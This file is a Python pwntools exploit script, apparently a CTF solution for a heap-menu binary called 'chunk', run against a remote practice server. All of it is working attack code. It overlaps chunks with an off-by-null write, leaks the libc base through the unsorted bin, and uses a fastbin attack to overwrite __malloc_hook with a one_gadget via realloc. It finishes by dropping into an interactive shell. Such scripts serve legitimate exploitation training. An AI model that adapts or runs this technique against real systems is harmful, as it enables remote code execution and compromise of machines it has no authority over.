from pwn import *
context.binary = ELF('./chunk')
context.log_level = 'debug'
elf= context.binary
libc = elf.libc

def dbg():
	gdb.attach(p)
	raw_input()

def menu(ch):
	p.sendlineafter('choice: ', str(ch))

def add(id, size):
	menu(1)
	p.sendlineafter('ID: ', str(id))
	p.sendlineafter('long: ', str(size))

def show(idx):
	menu(2)
	p.sendlineafter('show?', str(idx))

def free(idx):
	menu(3)
	p.sendlineafter('throw?', str(idx))

def edit(idx, content):
	menu(4)
	p.sendlineafter('write?', str(idx))
	p.sendlineafter('Content:', content)

def exploit():
	add(0, 0xf8)
	add(1, 0xf8)
	add(2, 0x68)
	add(3, 0x68)
	add(4, 0xff)

	edit(4, 0xf0*'\x00' + p64(0x100) + '\x11')
	free(2)
	free(3)
	free(0)

	add(3, 0x68)
	edit(3, 'a'*0x60 + p64(0x2e0))
	free(4)						#unsorted bin

	add(0, 0xf8)
	show(0)						#leak libc

	p.recvuntil('Content: ')
	libc_base = u64(p.recv(6).ljust(8, '\x00')) - 0x3c4f48

	print "libc_base ==> ", hex(libc_base)
	libc.address = libc_base
	realloc_hook = libc.symbols['__realloc_hook']
	malloc_hook = libc.symbols['__malloc_hook']
	realloc = libc.symbols['realloc']
	print "malloc_hook ==> ", hex(malloc_hook)
	print "realloc ==> ", hex(realloc)

	add(5, 0x80)				#padding
	add(6, 0x80)
	edit(6, '\x00'*0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 0x23))

	add(7, 0x68)				#padding
	add(8, 0x68)

	gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	payload = 'a'*0xb + p64(gadgets[2]+libc_base) + p64(realloc+12)
	edit(8, payload)

	#dbg()
	add(9, 0x10)				#trick
	p.interactive()
	p.close()


if __name__ == '__main__':
	p = remote('node3.buuoj.cn', 27464)
	elf= ELF('./chunk')
	#p = elf.process()		#env={'LD_PRELOAD':'./libc.so.6'}
	exploit()